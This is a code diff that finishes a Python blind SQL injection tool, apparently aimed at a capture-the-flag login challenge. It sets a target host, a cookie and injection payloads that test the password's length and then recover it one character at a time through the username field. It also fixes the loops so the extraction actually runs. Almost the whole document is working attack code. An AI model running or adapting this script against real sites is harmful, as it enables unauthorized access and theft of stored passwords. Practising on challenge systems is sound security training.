@@ -8,32 +8,28 @@ punctuation as P
 
 import requests
 
-# TODO blind_length()
-
 ##### Config
-HOST = ""
+HOST = "http://web.server.org"
 PORT = 80
-PATH = "/index.php?id="
+PATH = "/challenge/sqli/"
 METHOD = "POST"
 COOKIES = {
-    "uid": "1"
+    "uid": "123456"
 }
 DATA = {
-    "username": "admin",
-    "password": "<PAYLOAD>"
+    "username": "<PAYLOAD>",
+    "password": "foo"
 }
-
 CHARSET = D + L + U + P
-LENGTH = 0
 
-PAYLOAD_LENGTH = "1' AND (SELECT LENGTH(password) from users) = <LEN> #"
-PAYLOAD_BLIND = "1' AND SUBSTR((SELECT password from users), <POS>, 1) = <CHR> #"
+PAYLOAD_LENGTH = "admin' AND LENGTH(password) = <LEN> --+"
+PAYLOAD_BLIND = "admin' AND SUBSTR(password, <POS>, 1) = '<CHR>' --+"
 
-SERVER_YES = ""
-SERVER_NO = ""
+SERVER_YES = "Welcome back"
+SERVER_NO = "Error : no such user/password"
 ##########
 
-Class BlindSQLi():
+class BlindSQLi:
     def __init__(self, host, method, cookies, charset, payload_length, payload_blind):
         self.host = host
         self.method = method
@@ -48,8 +44,8 @@ Class BlindSQLi():
         self.s = requests.Session()
         self.s.cookies.update(COOKIES)
 
-        self.blind_length()
-        self.blind(self.length)
+        # self.blind_length()
+        self.blind()
 
     def blind_length(self):
         for i in range(self.maxlength):
@@ -80,7 +76,7 @@ Class BlindSQLi():
         print("[+] Length:", self.length)
 
     def blind(self):
-        for i in range(self.length):
+        for i in range(1, self.length + 1):
             for c in CHARSET:
                 payload = PAYLOAD_BLIND.replace("<POS>", str(i)).replace("<CHR>", c)
                 data = {}
@@ -97,14 +93,17 @@ Class BlindSQLi():
                     continue
                 elif SERVER_YES in res:
                     self.flag += c
-                    print("[+] Flag:", self.flag, end='\r')
+                    print("[+] Flag:", self.flag, end='\r', flush=True)
                     break
                 else:
                     print("[x] Can't find SERVER_NO nor SERVER_YES in response")
                     exit()
 
-            # TODO : if charset incomplete
+            if len(self.flag) != i:
+                print("[x] Charset seems incomplete")
+                exit()
 
+        print()
         print("[+] Finished")
 
     def send(self, data):
@@ -113,7 +112,7 @@ Class BlindSQLi():
         elif self.method == "GET":
             get_params_str = '?'
             for k in data.keys():
-                if data.keys().index(k) != 0:
+                if list(data.keys()).index(k) != 0:
                     get_params_str += '&'
                 get_params_str += (k + '=' + data[k])
             return self.s.get(self.host + get_params_str)
